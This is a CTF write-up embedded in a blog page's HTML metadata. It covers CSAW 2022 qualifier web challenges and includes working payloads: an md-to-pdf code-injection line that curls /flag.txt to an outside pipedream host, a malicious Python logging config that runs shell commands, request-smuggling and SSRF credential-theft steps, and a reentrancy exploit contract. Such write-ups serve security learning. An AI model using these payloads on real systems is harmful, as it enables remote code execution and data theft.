<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>CSAW 2K22 Quals - Writeups</title><link rel="preload" as="font" href=""/><meta name="description" content="er1a and I have participated in CSAW 2k22 Quals. Hope you enjoy my writeup for all Web tasks and one misc one ^^. 

## World wide web

![World wide web](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/world-wide-web_xlvzqa.png)
![world wide web root](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-firstly_dvcthr.png)  

![world wide web /stuff](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608174/csaw/world-wide-web-secondly_iahju2.png)  

I tried to find if there is any other **&lt;a&gt;** tags in the page.

![world wide web terminal curl](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608171/csaw/world-wide-web-third_qwc7dw.png)

Using browser devtool and CTRL+F I did 3 times each time I look for the **&lt;a&gt;** and click on it. Also I noticed that I got a very interesting cookie set.

![world wide web cookie](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608168/csaw/world-wide-web-cookie_sxiiau.png)

**solChain** well what got my attention is the chain part. If the server is actually tracking the sequence of path I have visited then there must be something. Also, I tried to repeat the process twice and I found out the sequence of words is the same.

Crafting my final script....

```py
import requests

url=&quot;http://web.chal.csaw.io:5010/&quot;


session = requests.Session()


with session : 
    next_word=&#x27;stuff&#x27;
    while True:
        response1= session.get(url+next_word)
        print(session.cookies)
        try:
            startingIndex=response1.text.index(&#x27;href=&quot;/&#x27;)
            endText=response1.text[startingIndex:].index(&#x27;&quot;&gt;&#x27;)
        except :
            print(response1.text)
            break
        print(&quot;next word:&quot;,response1.text[7+startingIndex:endText+startingIndex])
        next_word=response1.text[7+startingIndex:endText+startingIndex]
```

![world-wide-web-flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-flag_dtwoou.png)  

## My Little website

![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/my-little-website_yp34fj.png)

![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-challenge-pic_xuyuqc.png)

So as far my enumeration went that&#x27;s what I found:

- **expressJS** server running, identified with the headers.
- Opens a headless chrome instance to render the pdf.
- Dynamic XSS didn&#x27;t work, might be beacuse the bot doesn&#x27;t wait for the JS execution and even forcing it to wait doesn&#x27;t really work it renders the HTML,CSS and then the PDF.

A wild guess by my teammate **M0ngi** about the markdown parser, the CVE was *CVE-2021-23639* which occurs in the vulnerable version of *md-to-pdf*.

So we execute our final payload.

```md
---js
((require(&quot;child_process&quot;)).execSync(&quot;curl https://en7nqjdbzyckx.x.pipedream.net/ -d \&quot;$(cat /flag.txt)\&quot; &quot;))
---
```

![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-flag_sqrb1m.png)

## Good Intentions

![Good intentions](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/good-intentions_q5rbw9.png)

Reading through the code, I found that the upload is secure.
![Secure upload](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/secure-upload_cs0nrd.png)

But going further down the code the function to set the **logger** configuration file is vulnerable to **path traversal**.

![Unsecure Log set](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/unsecure_logconf_gan7js.png)

Here, I didn&#x27;t know which evil configuration should I **upload** then set the logger to. I needed to have RCE on the server. Fortunately enough, my teammate **n0s** sent me this link  of an [Evil logger](https%3A%2F%2Fgithub.com%2Fraj3shp%2Fpython-logging.config-exploit%2Fblob%2Fmain%2Fexploit%2Fbad-logger.conf%3Ffbclid%3DIwAR0W2Cdm3GLHqtFbAQjU3iatoSSTnlbj-kuUP_FYX3jYVHTvDvH7LrneBW4&amp;h=AT2QW5JZ9Xo6Qxu0-PtnFRXvizekY-KwhalZdV6aiTe0nGrJKkLDiGvLKFysZp_1QIS5xBW03o98eLDuK-LJYfHx4uSZwRB05MOYG7pu420p1iUPViifuWgRXOQHSLMjihPiJQ).

So the final chain will be as the following:

![good-intentions-request-chain](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608204/csaw/good-intentions-request-chain_wf7er2.png)

### Logger code **payload.conf**

```yaml
[loggers]
keys=root,simpleExample

[handlers]
keys=consoleHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=DEBUG
handlers=consoleHandler

[logger_simpleExample]
level=DEBUG
handlers=consoleHandler
qualname=simpleExample
propagate=0

[handler_consoleHandler]
class=__import__(&#x27;os&#x27;).system(&#x27;cat /flag.txt &gt; /app/application/static/images/de5fb214024af96b9f49ace64886c5/payload_ca36a4c20fafe498f263&#x27;)
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[formatter_simpleFormatter]
format=%(asctime)s - %(name)s - %(levelname)s - %(message)s
```

I fired up my postman to execute that and here comes the flag !
![Flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/Flag_zjj7z6.png)

## Smuggling Mail

![Smuggling mail](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail_kotgch.png)  

Going through the code, these are my findings:

- We got a **varnich** cache server.

![Smuggling-mail-varnish-conf](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/smuggling-mail-varnish-config_vlwtw8.png)  

- A **hitch** TLS proxy accepting HTTP/2 requests.
![smuggling-mail-hitch-conf](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608177/csaw/smuggling-mail-hitch-conf_t1dsbh.png)

A quick research on the **varnish** cache server and I found the **CVE-2021-36740**. Actually, the cache server which works as the &quot;frontend&quot; here passes the HTTP/2 to the backend which downgrades the request to HTTP/1 which will be handled as two requests. Yes, that&#x27;s a H2.CL vulnerability also there is a cve that made me try to HTTP Smuggling exploit.

![smuggling-mail cve](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608178/csaw/smuggling-mail-cve_s6xc02.png)

That&#x27;s perfectly our case, we want to bypass the authentication condition in the **varnish** config.
![smuggling-mail to bypass](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-to-bypass_mlxaam.png)

We can use the **/waitlist** endpoint for the original request but what do we want to do here ?
![smuggling-mail RCE code](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-rce-code_lze7hw.png)  

So we want to reach the **/admin/alert** to trigger an RCE but how can we do it ? Some research and with the help of my teammate &#x27;m0ngi&#x27; We found the last missing piece [Mailutils cve](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-mail-cve_vwprts.png)

&gt; We can **~ OUR_COMMAND**

### Putting it all together

![smuggling mail request](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-trigger-request_zcuwoo.png)
![Smuggling mail rce ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-rev-shell_nubljz.png)

## Lost in Amazon

![Lost in amazon](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/losti-in-amazon_topqca.png)  

&gt; This challenge was a little bit too blind. What caused confusion is the directory busting part. It&#x27;s not a natural thing to come to your mind while solving a CTF task.

I was really confused and couldn&#x27;t find a thing till I got a discord notification.

![Lost in Amazon Discord](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608187/csaw/lost-in-amazon-discord_vbgepl.png)  

Well, a quick directory busting with **wfuzz**, I found two endpoints.
![Lost in amazon Wfuzz output 1 ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-wfuzz-1_qjhpzv.png)  

I curled both paths, **/secret** gave me a JWT and **rockyou** a page that has nothing in it. 
![Lost in amazzon Confusion](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/lost-in-amazon-token-lost_rninuu.png)  

An intuitive move is to set the jwt token and revisit **/rockyou** right ? It gave me nothing. I tried to set **secret** cookie as the JWT too but nothing ...  also we should note that jwt itself has nothing interesting. I felt really like I hit a dead end.
![picture 18](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608185/csaw/lost-in-amazon-jwt-check_igswk3.png)  

At last, I reached for the admin, I knew that there was something unintuitive to do **also noting the cries of agony in the discord channel because of the task**
![Lost in amazon HINT](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-hint_c7cdii.png)  

Oh I see I had to fuzz one path deeper and found **/developer/heaven**
![Lost in amazon dirbusting depths 2](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608205/csaw/lost-in-amazon-dirb_bjnbne.png)  
![Lost in amazon /developer/heaven](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608219/csaw/lost-in-amazon-findings2_sfiezz.png)  

Now I have an idea why do I need the JWT token. I added a cookie with the name of **secret**.
![Lost in amazon access /developer/heaven](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608215/csaw/lost-in-amazon-access_zf2ld5.png)  

It was really easy now. Going back to the name of the Task and especially the **amazon** part. I knew it was an amazon SSRF vulnerability.
I didn&#x27;t waste any time.

&gt; I tried tempering with the _magiccall paramater but it gave nothing so I passed.

![Lost in amazon aws creds](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608194/csaw/lost-in-amazon-creds_df6cet.png)  

I added the profile to my **aws-cli**.
![Lost in amazon aws configure](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608193/csaw/lost-in-amazon-aws-config_nzybus.png)  

Then I tried to look for any **s3 buckets**
![Lost in amazon s3 error](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-s3_ie3fcj.png)  

My teammate **N0s** pinged me here and told me to try to specify the bucket region as buckets can be region-specific. So I looked for it
![Lost in amazon finding region](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608186/csaw/lost-in-amazon-region_tcoilm.png)  

and finally I got the flag.
![Lost in amazon flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608189/csaw/lost-in-amazon-flag-aws_qr4uzq.png)

## DonateMe

![Donate more](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608208/csaw/donate-more_efrhig.png)  

A basic **reentrancy vulnerability**. I crafted an evil contract to exploit it.

1. Send 0.0001 ether to trigger the reentrancy loop.
2. Stop the loop after the balance gets to 30.
3. Send the token via **getFlag**
   &gt; You can use ethers.utils.formatBytes32String(TOKEN) to get the right format to pass.
4. **yes** and get the flag.

```js
// SPDX-License-Identifier: MIT

pragma solidity &gt;=0.8.7;    

interface VictimContract { 
    function newAccount()  external payable;

    function donateOnce()  external;

    function getBalance() external view returns (uint256 donatorBalance) ;
    function getFlag(bytes32 _token) external ;
}

contract ExploitDonation { 
    address public victimAddress;
    VictimContract victimContract; 

    constructor(address _victimAddress){
            victimAddress=_victimAddress;
            victimContract=VictimContract(victimAddress);
    }

    function startAttack() public payable {
        victimContract.newAccount{value:msg.value}();
        victimContract.donateOnce();

    }

    fallback()external payable {
        uint my_balance= victimContract.getBalance();
        if (my_balance&lt;=20)
            victimContract.donateOnce();

    }

 function getBalance() public view returns (uint256) {
        return victimContract.getBalance();
    }

    function getFlag(bytes32 _token) public {
        victimContract.getFlag(_token);
    }
}
```

## Final words

I want to congratulate the organizers for their huge efforts and these great tasks.
Kudos to all my teammates for their perseverance and hard work during the competition. We successfully made it to the finals by achieving the first place in MENA !! Many words but not enough of them, all the efforts put to get such results, but most importantly **CSAW 2K22 finals here we come**.


## Links
- [Github Repo](https://github.com/yassinebk/ctf-writeups/blob/main/csaw-2k22-qual/README.md)
- [N0s Writeup](https://blog.anas-cherni.me/2022/09/14/csaw2k22/)
- [Raf² &amp; Adam](https://4n6nk8s.tech/2022/09/12/Writeups/csaw2022/?fbclid=IwAR2lkfD8gD6AggLv-c1P_tFP1PdK607fKFf4Rg5Ozi597A6lHdKlfM80wsw)
- [Ironbyte](https://l.facebook.com/l.php?u=https%3A%2F%2Fironbyte.me%2Fezmaze%2F%3Ffbclid%3DIwAR1UWnHRheApKCK7MtfcN_6lOBeSLEecT5NLBSETDwITNu-6bNPCnw497uA&amp;h=AT14Q4UItbyzfDyj05vOBfFIIKwME3bO40gyNJOqD3UR4a2bex6wsRTEk26B9c6GQdjVbxako_OZtruE3LkafzkaiL_aXfDFmo0W0RiOwke5hiQxeQMt1sFjz7zYx2nkUAy8Gw)"/><meta property="og:title" content="CSAW 2K22 Quals - Writeups"/><meta property="og:description" content="er1a and I have participated in CSAW 2k22 Quals. Hope you enjoy my writeup for all Web tasks and one misc one ^^. 

## World wide web

![World wide web](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/world-wide-web_xlvzqa.png)
![world wide web root](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-firstly_dvcthr.png)  

![world wide web /stuff](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608174/csaw/world-wide-web-secondly_iahju2.png)  

I tried to find if there is any other **&lt;a&gt;** tags in the page.

![world wide web terminal curl](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608171/csaw/world-wide-web-third_qwc7dw.png)

Using browser devtool and CTRL+F I did 3 times each time I look for the **&lt;a&gt;** and click on it. Also I noticed that I got a very interesting cookie set.

![world wide web cookie](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608168/csaw/world-wide-web-cookie_sxiiau.png)

**solChain** well what got my attention is the chain part. If the server is actually tracking the sequence of path I have visited then there must be something. Also, I tried to repeat the process twice and I found out the sequence of words is the same.

Crafting my final script....

```py
import requests

url=&quot;http://web.chal.csaw.io:5010/&quot;


session = requests.Session()


with session : 
    next_word=&#x27;stuff&#x27;
    while True:
        response1= session.get(url+next_word)
        print(session.cookies)
        try:
            startingIndex=response1.text.index(&#x27;href=&quot;/&#x27;)
            endText=response1.text[startingIndex:].index(&#x27;&quot;&gt;&#x27;)
        except :
            print(response1.text)
            break
        print(&quot;next word:&quot;,response1.text[7+startingIndex:endText+startingIndex])
        next_word=response1.text[7+startingIndex:endText+startingIndex]
```

![world-wide-web-flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-flag_dtwoou.png)  

## My Little website

![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/my-little-website_yp34fj.png)

![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-challenge-pic_xuyuqc.png)

So as far my enumeration went that&#x27;s what I found:

- **expressJS** server running, identified with the headers.
- Opens a headless chrome instance to render the pdf.
- Dynamic XSS didn&#x27;t work, might be beacuse the bot doesn&#x27;t wait for the JS execution and even forcing it to wait doesn&#x27;t really work it renders the HTML,CSS and then the PDF.

A wild guess by my teammate **M0ngi** about the markdown parser, the CVE was *CVE-2021-23639* which occurs in the vulnerable version of *md-to-pdf*.

So we execute our final payload.

```md
---js
((require(&quot;child_process&quot;)).execSync(&quot;curl https://en7nqjdbzyckx.x.pipedream.net/ -d \&quot;$(cat /flag.txt)\&quot; &quot;))
---
```

![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-flag_sqrb1m.png)

## Good Intentions

![Good intentions](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/good-intentions_q5rbw9.png)

Reading through the code, I found that the upload is secure.
![Secure upload](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/secure-upload_cs0nrd.png)

But going further down the code the function to set the **logger** configuration file is vulnerable to **path traversal**.

![Unsecure Log set](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/unsecure_logconf_gan7js.png)

Here, I didn&#x27;t know which evil configuration should I **upload** then set the logger to. I needed to have RCE on the server. Fortunately enough, my teammate **n0s** sent me this link  of an [Evil logger](https%3A%2F%2Fgithub.com%2Fraj3shp%2Fpython-logging.config-exploit%2Fblob%2Fmain%2Fexploit%2Fbad-logger.conf%3Ffbclid%3DIwAR0W2Cdm3GLHqtFbAQjU3iatoSSTnlbj-kuUP_FYX3jYVHTvDvH7LrneBW4&amp;h=AT2QW5JZ9Xo6Qxu0-PtnFRXvizekY-KwhalZdV6aiTe0nGrJKkLDiGvLKFysZp_1QIS5xBW03o98eLDuK-LJYfHx4uSZwRB05MOYG7pu420p1iUPViifuWgRXOQHSLMjihPiJQ).

So the final chain will be as the following:

![good-intentions-request-chain](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608204/csaw/good-intentions-request-chain_wf7er2.png)

### Logger code **payload.conf**

```yaml
[loggers]
keys=root,simpleExample

[handlers]
keys=consoleHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=DEBUG
handlers=consoleHandler

[logger_simpleExample]
level=DEBUG
handlers=consoleHandler
qualname=simpleExample
propagate=0

[handler_consoleHandler]
class=__import__(&#x27;os&#x27;).system(&#x27;cat /flag.txt &gt; /app/application/static/images/de5fb214024af96b9f49ace64886c5/payload_ca36a4c20fafe498f263&#x27;)
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[formatter_simpleFormatter]
format=%(asctime)s - %(name)s - %(levelname)s - %(message)s
```

I fired up my postman to execute that and here comes the flag !
![Flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/Flag_zjj7z6.png)

## Smuggling Mail

![Smuggling mail](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail_kotgch.png)  

Going through the code, these are my findings:

- We got a **varnich** cache server.

![Smuggling-mail-varnish-conf](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/smuggling-mail-varnish-config_vlwtw8.png)  

- A **hitch** TLS proxy accepting HTTP/2 requests.
![smuggling-mail-hitch-conf](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608177/csaw/smuggling-mail-hitch-conf_t1dsbh.png)

A quick research on the **varnish** cache server and I found the **CVE-2021-36740**. Actually, the cache server which works as the &quot;frontend&quot; here passes the HTTP/2 to the backend which downgrades the request to HTTP/1 which will be handled as two requests. Yes, that&#x27;s a H2.CL vulnerability also there is a cve that made me try to HTTP Smuggling exploit.

![smuggling-mail cve](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608178/csaw/smuggling-mail-cve_s6xc02.png)

That&#x27;s perfectly our case, we want to bypass the authentication condition in the **varnish** config.
![smuggling-mail to bypass](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-to-bypass_mlxaam.png)

We can use the **/waitlist** endpoint for the original request but what do we want to do here ?
![smuggling-mail RCE code](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-rce-code_lze7hw.png)  

So we want to reach the **/admin/alert** to trigger an RCE but how can we do it ? Some research and with the help of my teammate &#x27;m0ngi&#x27; We found the last missing piece [Mailutils cve](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-mail-cve_vwprts.png)

&gt; We can **~ OUR_COMMAND**

### Putting it all together

![smuggling mail request](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-trigger-request_zcuwoo.png)
![Smuggling mail rce ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-rev-shell_nubljz.png)

## Lost in Amazon

![Lost in amazon](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/losti-in-amazon_topqca.png)  

&gt; This challenge was a little bit too blind. What caused confusion is the directory busting part. It&#x27;s not a natural thing to come to your mind while solving a CTF task.

I was really confused and couldn&#x27;t find a thing till I got a discord notification.

![Lost in Amazon Discord](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608187/csaw/lost-in-amazon-discord_vbgepl.png)  

Well, a quick directory busting with **wfuzz**, I found two endpoints.
![Lost in amazon Wfuzz output 1 ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-wfuzz-1_qjhpzv.png)  

I curled both paths, **/secret** gave me a JWT and **rockyou** a page that has nothing in it. 
![Lost in amazzon Confusion](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/lost-in-amazon-token-lost_rninuu.png)  

An intuitive move is to set the jwt token and revisit **/rockyou** right ? It gave me nothing. I tried to set **secret** cookie as the JWT too but nothing ...  also we should note that jwt itself has nothing interesting. I felt really like I hit a dead end.
![picture 18](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608185/csaw/lost-in-amazon-jwt-check_igswk3.png)  

At last, I reached for the admin, I knew that there was something unintuitive to do **also noting the cries of agony in the discord channel because of the task**
![Lost in amazon HINT](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-hint_c7cdii.png)  

Oh I see I had to fuzz one path deeper and found **/developer/heaven**
![Lost in amazon dirbusting depths 2](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608205/csaw/lost-in-amazon-dirb_bjnbne.png)  
![Lost in amazon /developer/heaven](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608219/csaw/lost-in-amazon-findings2_sfiezz.png)  

Now I have an idea why do I need the JWT token. I added a cookie with the name of **secret**.
![Lost in amazon access /developer/heaven](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608215/csaw/lost-in-amazon-access_zf2ld5.png)  

It was really easy now. Going back to the name of the Task and especially the **amazon** part. I knew it was an amazon SSRF vulnerability.
I didn&#x27;t waste any time.

&gt; I tried tempering with the _magiccall paramater but it gave nothing so I passed.

![Lost in amazon aws creds](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608194/csaw/lost-in-amazon-creds_df6cet.png)  

I added the profile to my **aws-cli**.
![Lost in amazon aws configure](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608193/csaw/lost-in-amazon-aws-config_nzybus.png)  

Then I tried to look for any **s3 buckets**
![Lost in amazon s3 error](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-s3_ie3fcj.png)  

My teammate **N0s** pinged me here and told me to try to specify the bucket region as buckets can be region-specific. So I looked for it
![Lost in amazon finding region](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608186/csaw/lost-in-amazon-region_tcoilm.png)  

and finally I got the flag.
![Lost in amazon flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608189/csaw/lost-in-amazon-flag-aws_qr4uzq.png)

## DonateMe

![Donate more](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608208/csaw/donate-more_efrhig.png)  

A basic **reentrancy vulnerability**. I crafted an evil contract to exploit it.

1. Send 0.0001 ether to trigger the reentrancy loop.
2. Stop the loop after the balance gets to 30.
3. Send the token via **getFlag**
   &gt; You can use ethers.utils.formatBytes32String(TOKEN) to get the right format to pass.
4. **yes** and get the flag.

```js
// SPDX-License-Identifier: MIT

pragma solidity &gt;=0.8.7;    

interface VictimContract { 
    function newAccount()  external payable;

    function donateOnce()  external;

    function getBalance() external view returns (uint256 donatorBalance) ;
    function getFlag(bytes32 _token) external ;
}

contract ExploitDonation { 
    address public victimAddress;
    VictimContract victimContract; 

    constructor(address _victimAddress){
            victimAddress=_victimAddress;
            victimContract=VictimContract(victimAddress);
    }

    function startAttack() public payable {
        victimContract.newAccount{value:msg.value}();
        victimContract.donateOnce();

    }

    fallback()external payable {
        uint my_balance= victimContract.getBalance();
        if (my_balance&lt;=20)
            victimContract.donateOnce();

    }

 function getBalance() public view returns (uint256) {
        return victimContract.getBalance();
    }

    function getFlag(bytes32 _token) public {
        victimContract.getFlag(_token);
    }
}
```

## Final words

I want to congratulate the organizers for their huge efforts and these great tasks.
Kudos to all my teammates for their perseverance and hard work during the competition. We successfully made it to the finals by achieving the first place in MENA !! Many words but not enough of them, all the efforts put to get such results, but most importantly **CSAW 2K22 finals here we come**.


## Links
- [Github Repo](https://github.com/yassinebk/ctf-writeups/blob/main/csaw-2k22-qual/README.md)
- [N0s Writeup](https://blog.anas-cherni.me/2022/09/14/csaw2k22/)
- [Raf² &amp; Adam](https://4n6nk8s.tech/2022/09/12/Writeups/csaw2022/?fbclid=IwAR2lkfD8gD6AggLv-c1P_tFP1PdK607fKFf4Rg5Ozi597A6lHdKlfM80wsw)
- [Ironbyte](https://l.facebook.com/l.php?u=https%3A%2F%2Fironbyte.me%2Fezmaze%2F%3Ffbclid%3DIwAR1UWnHRheApKCK7MtfcN_6lOBeSLEecT5NLBSETDwITNu-6bNPCnw497uA&amp;h=AT14Q4UItbyzfDyj05vOBfFIIKwME3bO40gyNJOqD3UR4a2bex6wsRTEk26B9c6GQdjVbxako_OZtruE3LkafzkaiL_aXfDFmo0W0RiOwke5hiQxeQMt1sFjz7zYx2nkUAy8Gw)"/><meta property="og:image" content="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663609977/small_csaw_blog_main_98bebe18a4.jpg"/><meta name="google-site-verification" content="8uYSPvcdlfOzE8ienPTU-uSpjLTnUIyRKDOBDnlzWmg"/><link rel="icon" href="/favicon.ico"/><meta name="next-head-count" content="10"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="true"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="true"/><link href="/fonts/Inversionz_Unboxed.ttf"/><link rel="stylesheet" href="https://unpkg.com/dracula-prism/dist/css/dracula-prism.css"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/4e8ce417027ce9fd.css" as="style"/><link rel="stylesheet" href="/_next/static/css/4e8ce417027ce9fd.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-cb7634a8b6194820.js" defer=""></script><script src="/_next/static/chunks/framework-bb5c596eafb42b22.js" defer=""></script><script src="/_next/static/chunks/main-7d56226aa235ba8d.js" defer=""></script><script src="/_next/static/chunks/pages/_app-67eaf2f8eab9cd46.js" defer=""></script><script src="/_next/static/chunks/d7eeaac4-bfe9755f1bf975fd.js" defer=""></script><script src="/_next/static/chunks/386-6717aabe367a6d08.js" defer=""></script><script src="/_next/static/chunks/51-d003c1d266fa4195.js" defer=""></script><script src="/_next/static/chunks/934-578fd7722a3726cf.js" defer=""></script><script src="/_next/static/chunks/803-9857b6c9f5157efd.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-5dde6950f5b739f0.js" defer=""></script><script src="/_next/static/cFnxefjEU55VHjGAEuNKp/_buildManifest.js" defer=""></script><script src="/_next/static/cFnxefjEU55VHjGAEuNKp/_ssgManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Iceland&display=swap">@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPWK8.woff) format('woff')}@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPaKtMARJYk0o.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style><style data-href="https://fonts.googleapis.com/css2?family=Iceland&family=Sen:wght@400;700;800&display=swap">@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPWK8.woff) format('woff')}@font-face{font-family:'Sen';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKjdSxYI9_HmA.woff) format('woff')}@font-face{font-family:'Sen';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__J9CoKQ.woff) format('woff')}@font-face{font-family:'Sen';font-style:normal;font-weight:800;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__O9OoKQ.woff) format('woff')}@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPaKtMARJYk0o.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Sen';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKjdSxYI9_3kvWNAGn5LEwJ.woff2) format('woff2');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Sen';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKjdSxYI9_3nPWNAGn5LA.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Sen';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__J9CYI0v0BnYASNr7.woff2) 